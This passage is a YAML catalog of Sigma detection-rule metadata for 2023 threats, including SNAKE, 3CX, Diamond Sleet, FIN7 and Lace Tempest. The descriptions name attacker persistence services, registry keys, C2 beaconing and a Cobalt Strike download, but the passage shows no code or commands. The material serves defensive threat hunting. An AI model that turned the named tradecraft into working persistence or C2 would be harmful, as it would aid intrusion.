  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/SNAKE/proc_creation_win_malware_snake_service_execution.yml
  name: Potential SNAKE Malware Persistence Service Execution
  description: Detects a specific child/parent process relationship indicative of
    a "WerFault" process running from the "WinSxS" as a service. This could be indicative
    of potential SNAKE malware activity as reported by CISA.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF
  false_positives:
  - Unknown
  notes: ''
- detection_id: d0fa35db-0e92-400e-aa16-d32ae2521618
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/SNAKE/registry_event_malware_snake_covert_store_key.yml
  name: SNAKE Malware Covert Store Registry Key
  description: Detects any registry event that targets the key 'SECURITY\Policy\Secrets\n'
    which is a key related to SNAKE malware as described by CISA
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - detection.emerging-threats
  time_window: ''
  references:
  - https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF
  false_positives: []
  notes: ''
- detection_id: 7e163e96-b9a5-45d6-b2cd-d7d87b13c60b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/SNAKE/registry_set_malware_snake_encrypted_key.yml
  name: Potential Encrypted Registry Blob Related To SNAKE Malware
  description: Detects the creation of a registry value in the ".wav\OpenWithProgIds"
    key with an uncommon name. This could be related to SNAKE Malware as reported
    by CISA
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - detection.emerging-threats
  time_window: ''
  references:
  - https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF
  false_positives:
  - Some additional tuning might be required to tune out legitimate processes that
    write to this key by default
  notes: ''
- detection_id: b2e60816-96b2-45bd-ba91-b63578c03ef6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/SNAKE/win_system_malware_snake_persistence_service.yml
  name: SNAKE Malware Service Persistence
  description: Detects the creation of a service named "WerFaultSvc" which seems to
    be used by the SNAKE malware as a persistence mechanism as described by CISA in
    their report
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - detection.emerging-threats
  time_window: ''
  references:
  - https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7aaa5739-12fc-41aa-b98b-23ec27d42bdf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/Ursnif/proc_creation_win_malware_ursnif_cmd_redirection.yml
  name: Ursnif Redirection Of Discovery Commands
  description: 'Detects the redirection of Ursnif discovery commands as part of the
    initial execution of the malware.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  - detection.emerging-threats
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 70761fe8-6aa2-4f80-98c1-a57049c08e66
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/Malware/dns_query_win_malware_socgholish_second_stage_c2.yml
  name: Potential SocGholish Second Stage C2 DNS Query
  description: Detects a DNS query initiated from a "wscript" process for domains
    matching a specific pattern that was seen being used by SocGholish for its Command
    and Control traffic
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.virustotal.com/gui/file/0e2854753d17b1bb534de8e765d5813c9fb584a745978b3d92bc6ca78e3e7735/relations
  - https://www.virustotal.com/gui/file/d5661009c461a8b20e1ad22f48609cc84dd90aee9182e026659dde4d46aaf25e/relations
  - https://www.proofpoint.com/us/blog/threat-insight/part-1-socgholish-very-real-threat-very-fake-update
  false_positives:
  - Legitimate domain names matching the regex pattern by chance (e.g. domain controllers
    dc01.company.co.uk)
  notes: ''
- detection_id: bd03a0dc-5d93-49eb-b2e8-2dfd268600f8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/3CX-Supply-Chain/dns_query_win_malware_3cx_compromise.yml
  name: Potential Compromised 3CXDesktopApp Beaconing Activity - DNS
  description: Detects potential beaconing activity to domains related to 3CX 3CXDesktopApp
    compromise
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: d0b65ad3-e945-435e-a7a9-438e62dd48e9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/3CX-Supply-Chain/image_load_malware_3cx_compromise_susp_dll.yml
  name: Malicious DLL Load By Compromised 3CXDesktopApp
  description: Detects DLL load activity of known compromised DLLs used in by the
    compromised 3CXDesktopApp
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: critical
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2021/09/27/foggyweb-targeted-nobelium-malware-leads-to-persistent-backdoor/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 51eecf75-d069-43c7-9ea2-63f75499edd4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/3CX-Supply-Chain/net_connection_win_malware_3cx_compromise_beaconing_activity.yml
  name: Potential Compromised 3CXDesktopApp Beaconing Activity - Netcon
  description: Detects potential beaconing activity to domains related to 3CX 3CXDesktopApp
    compromise
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: network_connection
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 93bbde78-dc86-4e73-9ffc-ff8a384ca89c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/3CX-Supply-Chain/proc_creation_win_malware_3cx_compromise_execution.yml
  name: Potential Compromised 3CXDesktopApp Execution
  description: Detects execution of known compromised version of 3CXDesktopApp
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/
  false_positives:
  - Legitimate usage of 3CXDesktopApp
  notes: ''
- detection_id: 63f3605b-979f-48c2-b7cc-7f90523fed88
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/3CX-Supply-Chain/proc_creation_win_malware_3cx_compromise_susp_children.yml
  name: Potential Suspicious Child Process Of 3CXDesktopApp
  description: Detects potential suspicious child processes of "3CXDesktopApp.exe".
    Which could be related to the 3CXDesktopApp supply chain compromise
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.command-and-control
  - attack.execution
  - attack.defense-evasion
  - attack.t1218
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/
  - https://www.crowdstrike.com/blog/crowdstrike-detects-and-prevents-active-intrusion-campaign-targeting-3cxdesktopapp-customers/
  false_positives:
  - Unknown
  notes: ''
- detection_id: e7581747-1e44-4d4b-85a6-0db0b4a00f2a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/3CX-Supply-Chain/proc_creation_win_malware_3cx_compromise_susp_update.yml
  name: Potential Compromised 3CXDesktopApp Update Activity
  description: Detects the 3CXDesktopApp updater downloading a known compromised version
    of the 3CXDesktopApp software
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.linkedin.com/feed/update/urn:li:activity:7047435754834198529/
  - https://www.huntress.com/blog/3cx-voip-software-compromise-supply-chain-threats
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3c4b3bbf-36b4-470c-b6cf-f07e8b1c7e26
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/3CX-Supply-Chain/proxy_malware_3cx_compromise_c2_beacon_activity.yml
  name: Potential Compromised 3CXDesktopApp Beaconing Activity - Proxy
  description: Detects potential beaconing activity to domains related to 3CX 3CXDesktopApp
    compromise
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.reddit.com/r/crowdstrike/comments/125r3uu/20230329_situational_awareness_crowdstrike/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 76bc1601-9546-4b75-9419-06e0e8d10651
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/3CX-Supply-Chain/proxy_malware_3cx_compromise_susp_ico_requests.yml
  name: Potential Compromised 3CXDesktopApp ICO C2 File Download
  description: Detects potential malicious .ICO files download from a compromised
    3CXDesktopApp via web requests to the the malicious Github repository
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.sentinelone.com/blog/smoothoperator-ongoing-campaign-trojanizes-3cx-software-in-software-supply-chain-attack/
  - https://www.linkedin.com/feed/update/urn:li:activity:7047435754834198529/
  false_positives:
  - Unknown
  notes: ''
- detection_id: e64c8ef3-9f98-40c8-b71e-96110991cb4c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Cozy-Bear/image_load_apt_cozy_bear_graphical_proton_dlls.yml
  name: DLL Names Used By SVR For GraphicalProton Backdoor
  description: Hunts known SVR-specific DLL names.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8fa65166-f463-4fd2-ad4f-1436133c52e1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Cozy-Bear/win_security_apt_cozy_bear_scheduled_tasks_name.yml
  name: Scheduled Tasks Names Used By SVR For GraphicalProton Backdoor
  description: Hunts for known SVR-specific scheduled task names
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2bfc1373-0220-4fbd-8b10-33ddafd2a142
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Cozy-Bear/win_taskscheduler_apt_cozy_bear_graphical_proton_task_names.yml
  name: Scheduled Tasks Names Used By SVR For GraphicalProton Backdoor - Task Scheduler
  description: Hunts for known SVR-specific scheduled task names
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: taskscheduler
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a
  false_positives:
  - Unknown
  notes: ''
- detection_id: fba38e0f-4607-4344-bb8f-a4b50cdeef7f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Diamond-Sleet/dns_query_win_apt_diamond_steel_indicators.yml
  name: Diamond Sleet APT DNS Communication Indicators
  description: Detects DNS queries related to Diamond Sleet APT activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/
  false_positives:
  - Might generate some false positive if triggered by a user during investigation
    for example.
  notes: ''
- detection_id: e1212b32-55ff-4dfb-a595-62b572248056
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Diamond-Sleet/file_event_win_apt_diamond_sleet_indicators.yml
  name: Diamond Sleet APT File Creation Indicators
  description: Detects file creation activity that is related to Diamond Sleet APT
    activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: d1b65d98-37d7-4ff6-b139-2d87c1af3042
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Diamond-Sleet/image_load_apt_diamond_sleet_side_load.yml
  name: Diamond Sleet APT DLL Sideloading Indicators
  description: Detects DLL sideloading activity seen used by Diamond Sleet APT
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: image_load
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1574.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: b5495d8d-24ad-4a44-8caf-ceae9a07a5c2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Diamond-Sleet/proc_creation_win_apt_diamond_sleet_indicators.yml
  name: Diamond Sleet APT Process Activity Indicators
  description: Detects process creation activity indicators related to Diamond Sleet
    APT
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9f9f92ba-5300-43a4-b435-87d1ee571688
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Diamond-Sleet/registry_event_apt_diamond_sleet_scheduled_task.yml
  name: Diamond Sleet APT Scheduled Task Creation - Registry
  description: 'Detects registry event related to the creation of a scheduled task
    used by Diamond Sleet APT during exploitation of Team City CVE-2023-42793 vulnerability

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics: []
  techniques:
  - T1562
  tags:
  - attack.defense-evasion
  - attack.t1562
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3b8e5084-4de9-449a-a40d-0e11014f2e2d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Diamond-Sleet/win_security_apt_diamond_sleet_scheduled_task.yml
  name: Diamond Sleet APT Scheduled Task Creation
  description: 'Detects registry event related to the creation of a scheduled task
    used by Diamond Sleet APT during exploitation of Team City CVE-2023-42793 vulnerability

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.execution
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1053.005
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7fc30d63-728d-48d9-ad6f-14d14f4accf7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/EquationGroup/net_dns_apt_equation_group_triangulation_c2_coms.yml
  name: Potential Operation Triangulation C2 Beaconing Activity - DNS
  description: Detects potential beaconing activity to domains used in 0day attacks
    on iOS devices and revealed by Kaspersky and the FSB
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: ''
  product: ''
  category: dns
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  - attack.g0020
  - detection.emerging-threats
  time_window: ''
  references:
  - https://securelist.com/operation-triangulation/109842/
  - https://www-fsb-ru.translate.goog/fsb/press/message/single.htm!id=10439739@fsbMessage.html?_x_tr_sch=http&_x_tr_sl=ru&_x_tr_tl=en&_x_tr_hl=de&_x_tr_pto=wapp
  false_positives:
  - Unknown
  notes: ''
- detection_id: aa03c712-75c6-438b-8d42-de88f2427e09
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/EquationGroup/proxy_apt_equation_group_triangulation_c2_coms.yml
  name: Potential Operation Triangulation C2 Beaconing Activity - Proxy
  description: Detects potential beaconing activity to domains used in 0day attacks
    on iOS devices and revealed by Kaspersky and the FSB
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  - attack.g0020
  - detection.emerging-threats
  time_window: ''
  references:
  - https://securelist.com/operation-triangulation/109842/
  - https://www-fsb-ru.translate.goog/fsb/press/message/single.htm!id=10439739@fsbMessage.html?_x_tr_sch=http&_x_tr_sl=ru&_x_tr_tl=en&_x_tr_hl=de&_x_tr_pto=wapp
  false_positives:
  - Unknown
  notes: ''
- detection_id: a88d9f45-ec8a-4b0e-85ee-c9f6a65e9128
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/FIN7/file_event_win_apt_fin7_powershell_scripts_naming_convention.yml
  name: Potential APT FIN7 Related PowerShell Script Created
  description: Detects PowerShell script file creation with specific name or suffix
    which was seen being used often by FIN7 PowerShell scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - attack.g0046
  - detection.emerging-threats
  time_window: ''
  references:
  - https://labs.withsecure.com/publications/fin7-target-veeam-servers
  false_positives:
  - Unknown
  notes: ''
- detection_id: 71c432c4-e4da-4eab-ba49-e60ea9a81bca
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/FIN7/posh_ps_apt_fin7_powerhold.yml
  name: Potential APT FIN7 POWERHOLD Execution
  description: Detects execution of the POWERHOLD script seen used by FIN7 as reported
    by WithSecureLabs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.g0046
  - detection.emerging-threats
  time_window: ''
  references:
  - https://labs.withsecure.com/publications/fin7-target-veeam-servers
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4e19528a-f081-40dd-be09-90c39352bd64
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/FIN7/posh_ps_apt_fin7_powertrash_execution.yml
  name: Potential POWERTRASH Script Execution
  description: Detects potential execution of the PowerShell script POWERTRASH
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.g0046
  - detection.emerging-threats
  time_window: ''
  references:
  - https://labs.withsecure.com/publications/fin7-target-veeam-servers
  false_positives:
  - Unknown
  notes: ''
- detection_id: 911389c7-5ae3-43ea-bab3-a947ebdeb85e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/FIN7/proc_creation_win_apt_fin7_powertrash_lateral_movement.yml
  name: Potential APT FIN7 Reconnaissance/POWERTRASH Related Activity
  description: Detects specific command line execution used by FIN7 as reported by
    WithSecureLabs for reconnaissance and POWERTRASH execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - attack.g0046
  - detection.emerging-threats
  time_window: ''
  references:
  - https://labs.withsecure.com/publications/fin7-target-veeam-servers
  - https://labs.withsecure.com/publications/fin7-target-veeam-servers/jcr:content/root/responsivegrid/responsivegrid/responsivegrid/image_253944286.img.png/1682500394900.png
  - https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv
  false_positives:
  - Unlikely
  notes: ''
- detection_id: e94486ea-2650-4548-bf25-88cbd0bb32d7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Lace-Tempest/file_event_win_apt_lace_tempest_indicators.yml
  name: Lace Tempest File Indicators
  description: Detects PowerShell script file creation with specific names or suffixes
    which was seen being used often in PowerShell scripts by FIN7
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.sysaid.com/blog/service-desk/on-premise-software-security-vulnerability-notification
  false_positives:
  - Unlikely
  notes: ''
- detection_id: b377ddab-502d-4519-9e8c-5590033d2d70
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Lace-Tempest/posh_ps_apt_lace_tempest_eraser_script.yml
  name: Lace Tempest PowerShell Evidence Eraser
  description: 'Detects a PowerShell script used by Lace Tempest APT to erase evidence
    from victim servers by exploiting CVE-2023-47246 as reported by SysAid Team

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.sysaid.com/blog/service-desk/on-premise-software-security-vulnerability-notification
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 37dc5463-f7e3-4f61-ad76-ba59cd02a651
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Lace-Tempest/posh_ps_apt_lace_tempest_malware_launcher.yml
  name: Lace Tempest PowerShell Launcher
  description: 'Detects a PowerShell script used by Lace Tempest APT to launch their
    malware loader by exploiting CVE-2023-47246 as reported by SysAid Team

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ps_script
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.sysaid.com/blog/service-desk/on-premise-software-security-vulnerability-notification
  false_positives:
  - Unlikely
  notes: ''
- detection_id: aa5b0a40-ed88-46aa-9fdc-0337b379ca9d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2023/TA/Lace-Tempest/proc_creation_win_apt_lace_tempest_cobalt_strike_download.yml
  name: Lace Tempest Cobalt Strike Download
  description: Detects specific command line execution used by Lace Tempest to download
    Cobalt Strike as reported by SysAid Team
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
